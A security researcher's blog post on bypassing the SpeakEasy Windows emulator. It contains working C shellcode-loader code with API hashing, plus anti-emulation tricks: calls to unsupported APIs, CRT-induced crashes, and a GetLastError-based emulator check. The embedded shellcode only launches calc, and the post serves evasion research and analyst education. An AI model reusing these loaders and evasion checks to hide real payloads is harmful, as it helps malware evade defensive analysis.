+++
title = "Bypassing SpeakEasy"
draft = false
ShowToc = false
author = ["connar"]
+++

# Bypassing emulators - Exploring SpeakEasy

## What is SpeakEasy
Some of you may have used [SpeakEasy](https://github.com/mandiant/speakeasy) in CTF's (like [Flare on](https://fastcall.medium.com/using-speakeasy-emulator-on-flare-on-challenge-d981c8fba69c)), others might have used it in malware analysis or in general you might have head of it.  

Avoiding paraphrasing what SpeakEasy is, here is the official statement from their github page:  

![whatispeakeasy](/posts/bypassingspeakeasy/whatisspeakeasy.png)

Since this will not be a tutorial of how to use SpeakEasy or a general overview of it, you can read more about it and how it is used in the battlefield in [here](https://cloud.google.com/blog/topics/threat-intelligence/emulation-of-malicious-shellcode-with-speakeasy/). More or less though, SpeakEasy contains hooks for WINAPI's, that when called, it emulates their behavior and monitors the activity of the emulated sample.

While its very useful in tasks such as helping with automatic [api hash](https://connar.github.io/posts/apihashing/) resolution (solving the api hashing technique), its reliance on python based api hooks, introduces a problem. Because it does not run a real windows kernel, certain low-level artifacts, specifically registry hives and hardware specific data structures, are often either static or entirely ommited. These omissions then create detectable "fingerprints" that can be identified and bypassed on runtime.  

To get an idea of a limitation of SpeakEasy - without spoiling too much since we will see the limitations and their weaponization onwards - we can go through the example of unsupported WINAPI's. SpeakEasy uses apihooks for **some** WINAPI's. For example, here is a hook for `HeapAlloc`:  

![heapallochook](/posts/bypassingspeakeasy/heapallochook.png)

If `HeapAlloc` is called, the hook of it will be triggered to emulate the same logic. The problem is that Windows has a ton of WINAPI's and SpeakEasy does not contain all of them. Actually, it does not contain **most** of them (see section *Finding unsupported winapis*). Someone could take advantage of that, find what winapis are unsupported and call them. This would make SpeakEasy crash. More specifically, it would lead to *Unsupported API: [name of API]*.  
There is a solution of solving this by creating a hook for that API, but you can already imagine how time costly that is if you have a ton of unsupported API's in the sample you are trying to emulate. You can read more about it on section *[Bypassing Unsupported APIs](https://cloud.google.com/blog/topics/threat-intelligence/using-speakeasy-emulation-framework-programmatically-to-unpack-malware)* of this article.


This is just one of the many ways we can bypass SpeakEasy, which we will also be covering first. In general, the fact that SpeakEasy is opensource got me interested to try and bypass its emulation, thus making this post my first journey on the world of emulation bypasses!  

*Last word before starting, I would advise you to take a look into [the art of windows user space emulation](https://kitctf.de/talks/2025-02-13-windows-emulation/windows-emulation-slides.pdf) by Maurice Heumann, which will prepare you for the topic.*

Without further a due, let's begin. 

## Our template and a demo of SpeakEasy
The PoC we will be developing and modifying will be a `.c` template implementing API Hashing. The main WINAPI's we will be using will be `VirtualAlloc`, `VirtualProtect`, `CreateThread` and `WaitForSingleObject` in order to execute shellcode. The shellcode will simply be launching the calculator app.

```c
#include <windows.h>
#include <stdint.h>
#include <intrin.h>

// Definitions needed for PEB walking and API Hashing
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} MY_UNICODE_STRING;

typedef struct _MY_PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    void* DllBase;
    void* EntryPoint;
    ULONG SizeOfImage;
    MY_UNICODE_STRING FullDllName;
    MY_UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

typedef struct _MY_PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union {
        BOOLEAN BitField;
        struct {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PMY_PEB_LDR_DATA Ldr; 
} MY_PEB, *PMY_PEB;

// Defining the structure of the WINAPIs we will be using
typedef LPVOID (WINAPI *PfnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *PfnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI *PfnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  (WINAPI *PfnWaitForSingleObject)(HANDLE, DWORD);

/// x64 shellcode for launching calc
unsigned char buf[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x00";

// The hashing algorithm. It is the add_65599.py - you can find it in hashdb by oalabs
uint32_t hash(const unsigned char* data, size_t len) {
    uint32_t result = 0;
    for (size_t i = 0; i < len; ++i) {
        unsigned char c = data[i];
        uint32_t tmp = (uint32_t)c + 32;
        if ((((int)c - (int)'A') & 0xFFFF) > 26) {
            tmp = c;
        }
        uint64_t intermediate_product = (uint64_t)0x1003F * result;
        uint64_t intermediate_sum = (uint64_t)tmp + intermediate_product;
        result = (uint32_t)intermediate_sum;
    }
    return result;
}

void* ResolveApi(uint32_t targetHash) {
    MY_PEB* peb = (MY_PEB*)__readgsqword(0x60);
    MY_PEB_LDR_DATA* ldr = peb->Ldr;
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* curr = head->Flink;

    while (curr != head) {
        MY_LDR_DATA_TABLE_ENTRY* entry = (MY_LDR_DATA_TABLE_ENTRY*)CONTAINING_RECORD(curr, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->DllBase) {
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)entry->DllBase;
            if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
                PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)entry->DllBase + dos->e_lfanew);
                if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress != 0) {
                    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)entry->DllBase + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
                    DWORD* names = (DWORD*)((BYTE*)entry->DllBase + exp->AddressOfNames);
                    WORD* ordinals = (WORD*)((BYTE*)entry->DllBase + exp->AddressOfNameOrdinals);
                    DWORD* funcs = (DWORD*)((BYTE*)entry->DllBase + exp->AddressOfFunctions);
                    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
                        char* name = (char*)((BYTE*)entry->DllBase + names[i]);
                        size_t len = 0;
                        while(name[len]) len++;
                        if (hash((unsigned char*)name, len) == targetHash) {
                            return (void*)((BYTE*)entry->DllBase + funcs[ordinals[i]]);
                        }
                    }
                }
            }
        }
        curr = curr->Flink;
    }
    return NULL;
}

// Entry point
void WINAPI EntryPoint(void) {
    // Reserve shadow space for x64 calls
    __asm__("sub $0x28, %rsp");

    uint32_t h_VirtualAlloc = 0x5ACFDE4A;
    uint32_t h_VirtualProtect = 0x208602E4;
    uint32_t h_CreateThread = 0xA6EE5C26;
    uint32_t h_WaitForSingleObject = 0x12F2951B;

    PfnVirtualAlloc pVirtualAlloc = (PfnVirtualAlloc)ResolveApi(h_VirtualAlloc);
    PfnVirtualProtect pVirtualProtect = (PfnVirtualProtect)ResolveApi(h_VirtualProtect);
    PfnCreateThread pCreateThread = (PfnCreateThread)ResolveApi(h_CreateThread);
    PfnWaitForSingleObject pWaitForSingleObject = (PfnWaitForSingleObject)ResolveApi(h_WaitForSingleObject);

    if (!pVirtualAlloc || !pWaitForSingleObject) ExitProcess(1);

    
    void* exec_mem = pVirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem) {
        for (int i = 0; i < sizeof(buf); i++) {
            ((unsigned char*)exec_mem)[i] = buf[i];
        }

        DWORD old;
        if (pVirtualProtect(exec_mem, sizeof(buf), PAGE_EXECUTE_READ, &old)) {
             HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
             if (hThread) {
                 pWaitForSingleObject(hThread, 0xFFFFFFFF);
             }
        }
    }

    __asm__("add $0x28, %rsp");
    ExitProcess(0);
}
```

To get a feel of SpeakEasy, if we try to emulate our sample with it, it will resolve all hashes to their WINAPI names:
```
-$ speakeasy -t normal_sample.exe                                                                                                

* exec: module_entry
0x140001312: 'kernel32.VirtualAlloc(0x0, 0x111, 0x3000, "PAGE_READWRITE")' -> 0x50000
0x140001377: 'kernel32.VirtualProtect(0x50000, 0x111, 0x20, 0x13fff5c)' -> 0x1
0x1400013a9: 'kernel32.CreateThread(0x0, 0x0, 0x50000, 0x0, 0x0, 0x0)' -> 0x220
0x1400013c7: 'kernel32.WaitForSingleObject(0x220, 0xffffffff)' -> 0x0
0x1400013d9: 'KERNEL32.ExitProcess(0x0)' -> 0x0
* exec: thread
0x500e4: 'kernel32.WinExec("calc", 0x1)' -> 0x20
0x500f1: 'kernel32.GetVersion()' -> 0x1db10106
* Timeout of 60 sec(s) reached.
* Finished emulating
```
This is expected since we haven't developed any bypass technique yet.

Our goal will be to bypass SpeakEasy with various techniques. **In some of them**, we will show how we can implement a "*Variant of MITRE T1480.001*", a technique I came up with, utilizing side-channel behavior of real Windows in order to encrypt our hashes and evade emulation.


Let's now move into the bypasses.

## Technique 1: Unsupported APIs
The first way to defeat SpeakEasy is to find try and locate WINAPI's that are not yet implemented. As it was mentioned previously, because SpeakEasy is not a full OS, every single Windows API must be manually implemented in Python. If the malware calls an api that isn't implemented, SpeakEasy doesn't know how to handle the stack or return values, which causes it to crash.

### Finding unsupported WINAPI's
I wrote a Python script to automate the discovery of this limitation. It crawls the SpeakEasy `usermode` source code for `@apihook` decorators (used to declare a windows API function) and compares that list against the actual Export Address Table (EAT) of real Windows DLLs:
```py
import os
import re
import pefile

speakeasy_usermode_path = r"C:\Users\user\Downloads\speakeasy\speakeasy-1.6.1\speakeasy\winenv\api\usermode"
system32_path = r"C:\Windows\System32"

def get_speakeasy_hooks():
    hooks = {}
    pattern = re.compile(r"@apihook\(['\"]([^'\"]+)['\"]")

    if os.path.exists(speakeasy_usermode_path):
        for filename in os.listdir(speakeasy_usermode_path):
            if filename.endswith(".py") and filename != "__init__.py":
                dll_name = filename.replace(".py", "").lower()
                hooks[dll_name] = set()
                with open(os.path.join(speakeasy_usermode_path, filename), "r", errors="ignore") as f:
                    content = f.read()
                    matches = pattern.findall(content)
                    hooks[dll_name].update(matches)
    return hooks

def get_real_exports(dll_name):
    dll_path = os.path.join(system32_path, f"{dll_name}.dll")
    exports = set()
    if not os.path.exists(dll_path):
        return None 
    try:
        pe = pefile.PE(dll_path)
        if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
            for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
                if exp.name:
                    exports.add(exp.name.decode('utf-8'))
        return exports
    except Exception as e:
        print(f"[!] Error parsing {dll_name}.dll: {e}")
        return set()

def main():
    speakeasy_data = get_speakeasy_hooks()
    total_missing = 0
    for dll, hooked_funcs in speakeasy_data.items():
        real_funcs = get_real_exports(dll)
        if real_funcs is None: continue
        missing = real_funcs - hooked_funcs
        total_missing += len(missing)
        print(f"{dll:<15}.dll | Missing {len(missing)}")
    print(f"[+] Total missing API handlers: {total_missing}")

if __name__ == "__main__":
    main()
```

What the script does is going into the `usermode` of SpeakEasy's project folder, extracting and comparing every WINAPI that has a hook (`@apihook`) with the corresponding real windows dll. For example, it will open `advapi32.py` (mimicking the `advapi32.dll`) and extract all hook names:  

![usermode_logic](/posts/bypassingspeakeasy/usermode_logic.png)

It will then load the full name list of the real `advapi32.dll` and see how many are missing.
Running this script against a standard Windows 10/11 system shows that SpeakEasy is missing over 13,000 API handlers:
```
C:\Users\user\Downloads\speakeasy>python winapi-parser.py
advapi32       .dll | Missing 835
advpack        .dll | Missing 83
bcrypt         .dll | Missing 53
comctl32       .dll | Missing 117
crypt32        .dll | Missing 295
dnsapi         .dll | Missing 289
gdi32          .dll | Missing 954
iphlpapi       .dll | Missing 296
kernel32       .dll | Missing 1418
lz32           .dll | Missing 13
mpr            .dll | Missing 85
mscoree        .dll | Missing 122
msimg32        .dll | Missing 4
msvcrt         .dll | Missing 1244
ncrypt         .dll | Missing 145
netapi32       .dll | Missing 293
netutils       .dll | Missing 21
ntdll          .dll | Missing 2417
ole32          .dll | Missing 540
oleaut32       .dll | Missing 422
rpcrt4         .dll | Missing 554
secur32        .dll | Missing 100
sfc            .dll | Missing 6
shell32        .dll | Missing 474
shlwapi        .dll | Missing 378
urlmon         .dll | Missing 131
user32         .dll | Missing 944
winhttp        .dll | Missing 57
wininet        .dll | Missing 295
winmm          .dll | Missing 179
wkscli         .dll | Missing 22
ws2_32         .dll | Missing 164
wtsapi32       .dll | Missing 68
[+] Total missing API handlers: 13018
```
Like Ash Ketchum would have said if he was a malware analyst:  

![cantimplementemall](/posts/bypassingspeakeasy/cantimplementemall.png)

#### Unsupported WINAPI's - Triggering a crash via calling
We can make our python script more informative to print the unsupported WINAPI's. One such API is the `CreateJobObjectW`. Let's take the following template:
```c
#include <windows.h>
#include <stdint.h>
#include <intrin.h>

typedef struct _MY_UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } MY_UNICODE_STRING;
typedef struct _MY_LDR_DATA_TABLE_ENTRY { LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; void* DllBase; void* EntryPoint; ULONG SizeOfImage; MY_UNICODE_STRING FullDllName; MY_UNICODE_STRING BaseDllName; } MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;
typedef struct _MY_PEB_LDR_DATA { ULONG Length; BOOLEAN Initialized; HANDLE SsHandle; LIST_ENTRY InLoadOrderModuleList; } MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;
typedef struct _MY_PEB { BYTE Reserved1[2]; BYTE BeingDebugged; BYTE Reserved2[1]; PVOID Reserved3[2]; MY_PEB_LDR_DATA* Ldr; } MY_PEB, *PMY_PEB;

typedef LPVOID (WINAPI *PfnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *PfnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI *PfnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  (WINAPI *PfnWaitForSingleObject)(HANDLE, DWORD);

unsigned char buf[] = "\xfc\x48\x83...";

uint32_t hash(const unsigned char* data, size_t len) {
    ...
}

void* ResolveApi(uint32_t targetHash) {
    ...
}

void WINAPI EntryPoint(void) {
    /* We call CreateJobObjectW directly (no hashing). SpeakEasy will see this call 
    in the IAT and attempt to hook it. Since it's missing in kernel32.py
    it should crash. */
    CreateJobObjectW(NULL, NULL); 

    PfnVirtualAlloc pVirtualAlloc = (PfnVirtualAlloc)ResolveApi(0x5ACFDE4A);
    PfnVirtualProtect pVirtualProtect = (PfnVirtualProtect)ResolveApi(0x208602E4);
    PfnCreateThread pCreateThread = (PfnCreateThread)ResolveApi(0xA6EE5C26);
    PfnWaitForSingleObject pWaitForSingleObject = (PfnWaitForSingleObject)ResolveApi(0x12F2951B);

    if (pVirtualAlloc) {
        void* m = pVirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (m) {
            for (int i = 0; i < sizeof(buf); i++) { ((BYTE*)m)[i] = buf[i]; }
            DWORD old;
            if (pVirtualProtect(m, sizeof(buf), PAGE_EXECUTE_READ, &old)) {
                 HANDLE t = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)m, NULL, 0, NULL);
                 if (t) pWaitForSingleObject(t, 0xFFFFFFFF);
            }
        }
    }
    ExitProcess(0);
}
```

Compiling and running leads to SpeakEasy crashing and not proceeding with the emulation:
```
┌--(connar㉿vbox-kali)-[~/Downloads/poc_speakeasy]
└-$ x86_64-w64-mingw32-gcc -o bypass.exe bypass.c -m64 -nostdlib -nostartfiles -Wl,-e,EntryPoint -lkernel32 -ladvapi32
                                                                                                                                                                                                                                            
┌--(connar㉿vbox-kali)-[~/Downloads/poc_speakeasy]
└-$ speakeasy -t bypass.exe                                                                                           
/home/connar/Downloads/speakeasy-1.6.1/venv/lib/python3.13/site-packages/unicorn/unicorn.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
* exec: module_entry
0xfeedf00c: module_entry: Caught error: unsupported_api
Invalid memory read (UC_ERR_READ_UNMAPPED)
Unsupported API: KERNEL32.CreateJobObjectW (ret: 0x140001285)
* Finished emulating
```

We could also make it more difficult such as storing the expected return value of this api and comparing it with what `CreateJobObjectW` returns, just in case an analyst writes a dummy hook for it to make it still exit and not proceed with emulation. *The expected return value will be weaponized later in the environmental key encryption I mentioned in the beginning*.

#### Unsupported WINAPI's - Triggering a crash via compiling

Another way we could lead to the same emulation failure is via compiler instrumentation, which basically means compile our program using toolchains such as MSVC, where the compiler prepends a et of startup routines used to initialize the C runtime (CRT). These routines invoke fiber local storage (FLS) functions such as `FlsAlloc`, `FlsGetValue` and `FlsSetValue` to manage thread-related data. Since SpeakEasy is a py-based usermode emulator, the issue comes again to having the need of a "mock" implementation for every system call.

To compile this time, we will need to launch `x64 Native Tools Command Prompt for VS 2022` (at least I am using the 2022 version) and the compile command to run is:
```
cl.exe /Fe:crtbypass.exe crtbypass.c /link /subsystem:console
```

We can then compare the output from emulating it with Speakeasy versus running it on windows:

![crtbypass](/posts/bypassingspeakeasy/crtbypass.gif)

,which leads to a crash of `Unsupported API: kernel32.FlsGetValue2 (ret: 0x140006127)`.

The difference between the `MSVC` (VS Code) approach and the `MinGW` approach (the previous way of compilation) comes down to how much additional info the compiler adds to our code. The `MSVC` approach includes the microsoft C runtime (CRT). Instead of having our code as the starting point, it sets a function called `mainCRTStartup` as the start. So, before our Entrypoint, it calls a number of functions to set up things like thread handling and security cookies (one of them is the `FlsGetValue2`).  
The `MinGW` approach just compiles our code without adding any additional functions and dependencies.

> For the rest of the PoC's, we will be using the MinGW approach since `MSVC` will be crashing SpeakEasy every time.

#### The Analyst's Solution (Dummy Hooking)
[Mandiant suggests](https://cloud.google.com/blog/topics/threat-intelligence/using-speakeasy-emulation-framework-programmatically-to-unpack-malware) that if an API isn't critical for unpacking, an analyst can add a dummy api hook that simply returns `0` to keep emulation going. 

![madiants google blog](/posts/bypassingspeakeasy/cloudgooglecom.png)

This is where the second way of bypassing - `Variant of MITRE T1480.001` - comes into place.

#### Weaponizing the Fix (MITRE T1480.001 - Environmental Keying)
The technique I will be implementing is inspired from the `Environmental Keying (MITRE T1480.001)`, but the objective is different. In `T480.001`, system values are used as keys (for example [Volume Serial Numbers](https://cloud.google.com/blog/topics/threat-intelligence/lowkey-hunting-missing-volume-serial-id)) to ensure a payload runs only on a specific target. In the technique we will be developing, we weaponize the return value of an unsupported or in general an API as our encryption / decryption key. We will call API's and use their expected return value on real windows as the key, so even if an analyst attempts to write a dummy apihook that returns a generic value such as 0 (as their blog suggested), they end up providing the wrong key and thus, the emulation will fail.

To get an idea of Environmental Keying, you can read through the MITRE page, but more or less, here are some examples:
| Malware Family / Group | Keying Technique | Relation to emulation bypass
| :--- | :--- | :---
| **APT41 / PowerPunch** | Derives unique XOR keys from the Volume Serial Number. | Targets unique hardware, incorrectly spoofed by emulators. |
| **PUBLOAD / TONESHELL** | Combines **Computer Name**, **Username**, and **Tick Count** to generate victim-specific keys. | Weaponizes the static values found in default.json |
| **ROKRAT** | Decrypts critical strings only if the system matches a specific **Hardcoded Hostname**. |

To create a PoC, we will be using `GetLastError()` as our key after an intended unsuccessful action. In real windows we will know what the `GetLastError()` value will be, but in an emulator usually there is no error in order to keep the malware running.

##### GetLastError()
The PoC will be from making an API call to `CreateFileA` to read a nonexistent file. SpeakEasy will be faking the read into a successful action, and thus if we call `GetLastError()`, the result will be 0.  
For starters, we will go through into SpeakEasy makes GetLastError() return 0 and then see how we can weaponize it as a xor key for obfuscating our hashes even further:
```c
#include <windows.h>
#include <stdint.h>
#include <intrin.h>

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} MY_UNICODE_STRING;

typedef struct _MY_PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    void* DllBase;
    void* EntryPoint;
    ULONG SizeOfImage;
    MY_UNICODE_STRING FullDllName;
    MY_UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

typedef struct _MY_PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union {
        BOOLEAN BitField;
        struct {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PMY_PEB_LDR_DATA Ldr; 
} MY_PEB, *PMY_PEB;

typedef LPVOID (WINAPI *PfnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *PfnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI *PfnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  (WINAPI *PfnWaitForSingleObject)(HANDLE, DWORD);
typedef HANDLE (WINAPI *PfnCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);

unsigned char buf[] = 
"\xfc\x48\x83...";

uint32_t hash(const unsigned char* data, size_t len) {
    ...
}

void* ResolveApi(uint32_t targetHash) {
    ...
}

void WINAPI EntryPoint(void) {
    __asm__("sub $0x28, %rsp");

    uint32_t h_VirtualAlloc = 0x5ACFDE4A;
    uint32_t h_VirtualProtect = 0x208602E4;
    uint32_t h_CreateThread = 0xA6EE5C26;
    uint32_t h_WaitForSingleObject = 0x12F2951B;
    uint32_t h_CreateFileA = 0xDE99D569; // compute it via add_65599.py

    PfnCreateFileA pCreateFileA = (PfnCreateFileA)ResolveApi(h_CreateFileA);
    PfnVirtualAlloc pVirtualAlloc = (PfnVirtualAlloc)ResolveApi(h_VirtualAlloc);
    PfnVirtualProtect pVirtualProtect = (PfnVirtualProtect)ResolveApi(h_VirtualProtect);
    PfnCreateThread pCreateThread = (PfnCreateThread)ResolveApi(h_CreateThread);
    PfnWaitForSingleObject pWaitForSingleObject = (PfnWaitForSingleObject)ResolveApi(h_WaitForSingleObject);

    if (!pCreateFileA || !pVirtualAlloc || !pWaitForSingleObject) ExitProcess(1);

    // Trigger ERROR_FILE_NOT_FOUND (0x2) by opening non-existent file
    pCreateFileA("C:\\fake_file.txt", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    
    if (GetLastError() != 2) {
        ExitProcess(0xDEADC0DE); // Emulator detected!
    }

    void* exec_mem = pVirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem) {
        for (int i = 0; i < sizeof(buf); i++) {
            ((unsigned char*)exec_mem)[i] = buf[i];
        }

        DWORD old;
        if (pVirtualProtect(exec_mem, sizeof(buf), PAGE_EXECUTE_READ, &old)) {
             HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
             if (hThread) {
                 pWaitForSingleObject(hThread, 0xFFFFFFFF);
             }
        }
    }

    __asm__("add $0x28, %rsp");
    ExitProcess(0);
}
```


To compile:
```
x86_64-w64-mingw32-gcc poc.c -o poc.exe -m64 -nostdlib -nostartfiles -Wl,-e,EntryPoint -lkernel32 -luser32
```
Compiling our template with this technique, we will see that indeed SpeakEasy will return success instead of failure (0x02):
```
> -$ speakeasy -t poc.exe
  import pkg_resources
* exec: module_entry
0x140001330: 'kernel32.CreateFileA("C:\\fake_file.txt", "GENERIC_READ", 0x0, 0x0, "OPEN_EXISTING", 0x0, 0x0)' -> 0x80
0x140001339: 'KERNEL32.GetLastError()' -> 0x0
0x14000134c: 'KERNEL32.ExitProcess(0xdeadc0de)' -> 0x0
* Finished emulating
```

But in normal windows, it will launch the calc app.

**What happens behind the scenes**:  
When the malware executes `pCreateFileA`, the underlying CPU engine (Unicorn) attempts to fetch an instruction from an unmapped memory address (the API hook range). Speakeasy's core dispatcher in winemu.py catches this and begins the resolution process.

File: [winemu.py](https://github.com/mandiant/speakeasy/blob/master/speakeasy/windows/winemu.py#L1141)
```py
def handle_import_func(self, dll, name):
    """
    Forward imported functions to the corresponding handler (if any).
    """
    imp_api = '%s.%s' % (dll, name)
    mod, func_attrs = self.api.get_export_func_handler(dll, name)
    
    if func_attrs:
        handler_name, func, argc, conv, ordinal = func_attrs
        argv = self.get_func_argv(conv, argc)
        
        try:
            # The dispatcher captures the return value (rv) from the API manager
            rv = self.api.call_api_func(mod, func, argv, ctx=default_ctx)
```

The execution is bridged through winapi.py, which acts as the caller for the specific Python hook. The func variable here is a direct reference to the CreateFile method in kernel32.py.

File: [winapi.py](https://github.com/mandiant/speakeasy/blob/master/speakeasy/winenv/api/winapi.py#L73)
```py
def call_api_func(self, mod, func, argv, ctx):
    """
    Call the handler to implement the imported API
    """
    # This executes kernel32.CreateFile(mod, self.emu, argv, ctx)
    return func(mod, self.emu, argv, ctx)
```

Inside the hook, Speakeasy identifies that the file is missing and that the user requested OPEN_EXISTING. It correctly sets the Windows error code, but then triggers a fateful call to the FileManager to "open" the file anyway to maintain emulation continuity.
File: [kernel32.py](https://github.com/mandiant/speakeasy/blob/master/speakeasy/winenv/api/usermode/kernel32.py#L3450)
```py
@apihook('CreateFile', argc=7)
def CreateFile(self, emu, argv, ctx={}):
    ... 
    hnd = windefs.INVALID_HANDLE_VALUE # (Initialization of hnd to -1)

    if obj:
        hnd = self.get_object_handle(obj)
    else:
        if self.does_file_exist(target):
            # ...
        else: # file did not exist, so we enter here
            if disp == windefs.OPEN_EXISTING:
                # Initially, it correctly sets the LastError value of 2
                emu.set_last_error(windefs.ERROR_FILE_NOT_FOUND) # LastError = 2

    # The hook then calls the File Manager to retrieve a handle
    hnd = self.file_open(target, create=True) 
    return hnd
```

This is the critical failure point. Even though the file is missing and the hook correctly returns the value of `ERROR_FILE_NOT_FOUND`, the FileManager attempts to "repair" the call by creating a dummy File object. The generated handle is pulled from a hardcoded class variable: 0x80.
